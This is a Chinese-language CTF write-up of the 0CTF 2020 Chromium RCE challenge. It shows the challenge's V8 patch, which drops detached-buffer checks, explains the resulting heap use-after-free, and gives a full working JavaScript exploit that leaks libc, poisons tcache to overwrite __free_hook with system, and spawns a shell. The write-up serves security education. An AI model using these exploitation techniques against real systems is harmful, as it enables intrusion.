# 0CTF Chromium RCE WriteUp

阅读量 **245476**

|评论 **3**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-07-06 12:00:00

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t018a8dc049cd6200af.png)

萌新分析一下这次0CTF的Chromium RCE。有哪里分析的不对的地方欢迎大佬批评指正🙋‍♂️。

## 题目描述

It’s v8, but it’s not a typical v8, it’s CTF v8! Please enjoy pwning this d8 🙂

    
    
    nc pwnable.org 40404
    

Enviroment: Ubuntu18.04

**Update:** If you want to build one for debugging, please  
`git checkout f7a1932ef928c190de32dd78246f75bd4ca8778b`

做题的时候并没有太在意这个描述，解出来之后发现说的挺对的: D。hash是之后补上的，补之前还在纳闷怎么找是哪个版本…

## Patch

关于搭建环境的部分就略过了，可以参考之前的[文章](http:/blog.keenan.top/2019/11/05/Installing-V8-on-Ubuntu19-04/)。只要你有一个好用的代理这一步不成问题。

    
    
    diff --git a/src/builtins/typed-array-set.tq b/src/builtins/typed-array-set.tq
    index b5c9dcb261..babe7da3f0 100644
    --- a/src/builtins/typed-array-set.tq
    +++ b/src/builtins/typed-array-set.tq
    @@ -70,7 +70,7 @@ TypedArrayPrototypeSet(
         // 7. Let targetBuffer be target.[[ViewedArrayBuffer]].
         // 8. If IsDetachedBuffer(targetBuffer) is true, throw a TypeError
         //   exception.
    -    const utarget = typed_array::EnsureAttached(target) otherwise IsDetached;
    +    const utarget = %RawDownCast<AttachedJSTypedArray>(target);
    
         const overloadedArg = arguments[0];
         try {
    @@ -86,8 +86,7 @@ TypedArrayPrototypeSet(
           // 10. Let srcBuffer be typedArray.[[ViewedArrayBuffer]].
           // 11. If IsDetachedBuffer(srcBuffer) is true, throw a TypeError
           //   exception.
    -      const utypedArray =
    -          typed_array::EnsureAttached(typedArray) otherwise IsDetached;
    +      const utypedArray = %RawDownCast<AttachedJSTypedArray>(typedArray);
    
           TypedArrayPrototypeSetTypedArray(
               utarget, utypedArray, targetOffset, targetOffsetOverflowed)
    diff --git a/src/d8/d8.cc b/src/d8/d8.cc
    index 117df1cc52..9c6ca7275d 100644
    --- a/src/d8/d8.cc
    +++ b/src/d8/d8.cc
    @@ -1339,9 +1339,9 @@ MaybeLocal<Context> Shell::CreateRealm(
         }
         delete[] old_realms;
       }
    -  Local<ObjectTemplate> global_template = CreateGlobalTemplate(isolate);
       Local<Context> context =
    -      Context::New(isolate, nullptr, global_template, global_object);
    +      Context::New(isolate, nullptr, ObjectTemplate::New(isolate),
    +                   v8::MaybeLocal<Value>());
       DCHECK(!try_catch.HasCaught());
       if (context.IsEmpty()) return MaybeLocal<Context>();
       InitializeModuleEmbedderData(context);
    @@ -2260,10 +2260,7 @@ void Shell::Initialize(Isolate* isolate, D8Console* console,
                 v8::Isolate::kMessageLog);
       }
    
    -  isolate->SetHostImportModuleDynamicallyCallback(
    -      Shell::HostImportModuleDynamically);
    -  isolate->SetHostInitializeImportMetaObjectCallback(
    -      Shell::HostInitializeImportMetaObject);
    +  // `import("xx")` is not allowed
    
     #ifdef V8_FUZZILLI
       // Let the parent process (Fuzzilli) know we are ready.
    @@ -2285,9 +2282,9 @@ Local<Context> Shell::CreateEvaluationContext(Isolate* isolate) {
       // This needs to be a critical section since this is not thread-safe
       base::MutexGuard lock_guard(context_mutex_.Pointer());
       // Initialize the global objects
    -  Local<ObjectTemplate> global_template = CreateGlobalTemplate(isolate);
       EscapableHandleScope handle_scope(isolate);
    -  Local<Context> context = Context::New(isolate, nullptr, global_template);
    +  Local<Context> context = Context::New(isolate, nullptr,
    +                                        ObjectTemplate::New(isolate));
       DCHECK(!context.IsEmpty());
       if (i::FLAG_perf_prof_annotate_wasm || i::FLAG_vtune_prof_annotate_wasm) {
         isolate->SetWasmLoadSourceMapCallback(ReadFile);
    diff --git a/src/parsing/parser-base.h b/src/parsing/parser-base.h
    index 3519599a88..f1ba0fb445 100644
    --- a/src/parsing/parser-base.h
    +++ b/src/parsing/parser-base.h
    @@ -1907,10 +1907,8 @@ ParserBase<Impl>::ParsePrimaryExpression() {
           return ParseTemplateLiteral(impl()->NullExpression(), beg_pos, false);
    
         case Token::MOD:
    -      if (flags().allow_natives_syntax() || extension_ != nullptr) {
    -        return ParseV8Intrinsic();
    -      }
    -      break;
    +      // Directly call %ArrayBufferDetach without `--allow-native-syntax` flag
    +      return ParseV8Intrinsic();
    
         default:
           break;
    diff --git a/src/parsing/parser.cc b/src/parsing/parser.cc
    index 9577b37397..2206d250d7 100644
    --- a/src/parsing/parser.cc
    +++ b/src/parsing/parser.cc
    @@ -357,6 +357,11 @@ Expression* Parser::NewV8Intrinsic(const AstRawString* name,
       const Runtime::Function* function =
           Runtime::FunctionForName(name->raw_data(), name->length());
    
    +  // Only %ArrayBufferDetach allowed
    +  if (function->function_id != Runtime::kArrayBufferDetach) {
    +    return factory()->NewUndefinedLiteral(kNoSourcePosition);
    +  }
    +
       // Be more permissive when fuzzing. Intrinsics are not supported.
       if (FLAG_fuzzing) {
         return NewV8RuntimeFunctionForFuzzing(function, args, pos);
    

patch中比较关键的部分就是关于Attached检查的部分：

    
    
    -    const utarget = typed_array::EnsureAttached(target) otherwise IsDetached;
    +    const utarget = %RawDownCast<AttachedJSTypedArray>(target);
    

可以看到原本的代码是有检查的，修改之后变成了默认都是Attached的状态。

之后的patch主要是避免非预期，例如删去了import的功能，还有就是删去了`--allow-native-syntax`的支持，这样%DebugPrint和%SystemBreak都不可以使用了。但是%ArrayBufferDetach是可以直接使用的。估计题目附件中的d8是一个阉割版的debug
version。

## Vuln

首先验证一下read
import等非预期解法是不可行的。事实上在题目环境中，直接读flag文件是不可能的，只有root权限可以读，但是提供了一个suid的readflag可执行文件，这就相当于强迫要求拿到rce。

为了方便调试，可以删去对`--allow-native-syntax`的patch，这样就可以快乐debug了。

漏洞点还是很明显的，显然在于是否是Attached的状态的混用。

正常情况下，我们去声明一个Uint8Array，这是一个typed array，其有对应的buffer，如：

    
    
    var a = new Uint8Array(0x200);
    // a.buffer: chunk on glibc heap space
    

这里的a.buffer就是我们熟知的ArrayBuffer。其对应的内存空间也就是ArrayBuffer的backing_store指针指向的空间，用gdb调一下就知道，该空间是glibc的堆空间上的一个堆块。当我们使用%ArrayBufferDetach去detach一个buffer时，该buffer也就被释放掉了，也就是backing_store指向的堆块被释放掉了。由于环境是ubuntu
1804，该堆块也就进入tcache了。

    
    
    var a = new Uint8Array(0x200);
    %ArrayBufferDetach(a.buffer); // into tcache
    

而在之前的patch中，删去了对于是否是Attached状态的检查，默认都是Attached。这样我们就可以读写freed chunk了！

> It’s v8, but it’s not a typical v8, it’s CTF v8! Please enjoy pwning this d8
> 🙂

确实，你以为我是browser pwn，其实我是glibc heap哒。

## Exploit

利用起来就比较容易了。

第一步，泄露地址。释放大的堆块进入unsortedbin，读取array，可以拿到堆地址和libc地址。

第二步，tcache
dup改hook。同样用uaf把tcache的fd改为free_hook。有一个坑点在于，ArrayBuffer在分配的时候使用calloc分配的，但是calloc不用tcache。可以找到这样的写法使得Array使用malloc分配内存：

    
    
    let a = {};
    a.length = size; // malloc的大小
    return new Uint8Array(a);
    

这样就可以使用malloc了，拿到free_hook的array，写入system地址。

第三步：用%ArrayBufferDetach释放一个保存了`/bin/sh`字符串的array。相当于执行`system('/bin/sh')`

完整exploit脚本：

    
    
    function gc(){
        for(var i = 0; i < 1024 * 1024* 16; i++){
            new String;
        }
    }
    
    function f2i(f){
        float64 = new Float64Array(1);
        float64[0] = f;
        int32 = new Uint32Array(float64.buffer);
        return int32[1] * 0x100000000 + int32[0];
    }
    
    function i2f(i){
        int32 = new Uint32Array(2);
        int32[1] = i / 0x100000000;
        int32[0] = i % 0x100000000;
        float64 = new Float64Array(int32.buffer);
        return float64[0];
    }
    
    function hex(i){
        return '0x'+i.toString(16).padStart(16, '0');
    }
    
    // ArrayBuffer use calloc so tcache won't be used
    function calloc(size){
        var a = new Uint8Array(size);
        return a;
    }
    
    function malloc(size){
        var a = {};
        a.length = size;
        var b = new Uint8Array(a);
        return b;
    }
    
    // free(array.buffer)
    function free(a){
        return %ArrayBufferDetach(a);
    }
    
    function b2i(a){
        var b = new BigUint64Array(a.buffer);
        return b[0];
    }
    
    
    
    /* function check for malloc/calloc/free
    var c0 = calloc(0x200);
    %DebugPrint(c0.buffer);
    free(c0.buffer);
    %SystemBreak();
    var c1 = malloc(0x200);
    %DebugPrint(c1.buffer);
    %SystemBreak();
    */
    
    // try to free a binsh chunk
    // binsh: 2f62696e2f7368
    var binsh_chunk = new Uint8Array(0x200);
    binsh_chunk[7] = 0x00;
    binsh_chunk[6] = 0x68;
    binsh_chunk[5] = 0x73;
    binsh_chunk[4] = 0x2f;
    binsh_chunk[3] = 0x6e;
    binsh_chunk[2] = 0x69;
    binsh_chunk[1] = 0x62;
    binsh_chunk[0] = 0x2f;
    //%DebugPrint(binsh_chunk.buffer);
    
    
    var overchunk = calloc(0x3000);
    var c0 = calloc(0x800);
    var c1 = calloc(0x800);
    //%DebugPrint(c0.buffer);
    //%DebugPrint(c1.buffer);
    free(c0.buffer);
    free(c1.buffer);
    //%SystemBreak();
    overchunk.set(c1);
    var heap_leak = b2i(overchunk.slice(0, 8));
    var libc_leak = b2i(overchunk.slice(8, 16)); // main_arena+96
    console.log('libc_leak: '+hex(libc_leak));
    var libc_base = libc_leak-0x00007f7f8e78dca0n+0x7f7f8e3a2000n
    console.log('libc_base: '+hex(libc_base));
    /*
    ========== function ==========
    system:0x4f440
    execve:0xe4e30
    open:0x7a0ce0
    read:0x7a0340
    write:0x7a0270
    gets:0x800b0
    setcontext+0x35:0x520a5
    ========== variables ==========
    __malloc_hook(0x3ebc30)             : 0x0000000000000000
    __free_hook(0x3ed8e8)               : 0x0000000000000000
    __realloc_hook(0x3ebc28)            : 0x00007fc640ebb790
    stdin(0x3ec850)                     : 0x00007fc64120ea00
    stdout(0x3ec848)                    : 0x00007fc64120f760
    _IO_list_all(0x3ec660)              : 0x00007fc64120f680
    __after_morecore_hook(0x3ed8e0)     : 0x0000000000000000
    */
    var free_hook = libc_base+0x3ed8e8n
    console.log('free_hook: '+hex(free_hook));
    var system = libc_base+0x4f440n
    console.log('system: '+hex(system));
    
    // tcache dup to free_hook
    var c2 = calloc(0x200);
    var c3 = calloc(0x200);
    %DebugPrint(c3.buffer);
    free(c2.buffer);
    free(c3.buffer);
    
    function i2l(i){
        var b = new Uint8Array(BigUint64Array.from([i]).buffer);
        return b;
    }
    
    c3.set(i2l(free_hook)); // fd->free_hook
    
    // change free_hook to system
    var c4 = malloc(0x200);
    var c5 = malloc(0x200); // got free_hook
    c5.set(i2l(system)); // free_hook = system
    console.log('Trigger!')
    free(binsh_chunk.buffer);
    
    //%SystemBreak();
    

前面gc几个函数没用到，可以删掉。

## 后记

在之前做过的题目中，有oob有jit，就是没有uaf，这次齐全了。看起来UAF的利用要更简单，没有addrof
fakeobj之类的步骤（仅这道题目而言）。如果是其他的object，有虚表的话直接覆盖函数指针也是极好的，这也是最开始的思路。

不过比赛的时候也就止步于此了 : D， 后边的SBX应该需要编译Chrome，估计磁盘不够用。FullChain需要SBX作为前置步骤。

这个题目其实是这次Pwn中最简单的。大佬们2个小时就做出来了，可见是有多熟练…

总共11道PWN题目，其中5道题目是browser/js的题目，看来是要引领一波浏览器的浪潮了。期待看到更多的d8伯😃。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Keenan** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/209401](/post/id/209401)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)
  * [RCE](/tag/RCE)
  * [v8](/tag/v8)
  * [Chromium](/tag/Chromium)

 **+1** __2赞

 __收藏

![](https://p1.ssl.qhimg.com/t010857340ce46bb672.jpg) Keenan

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

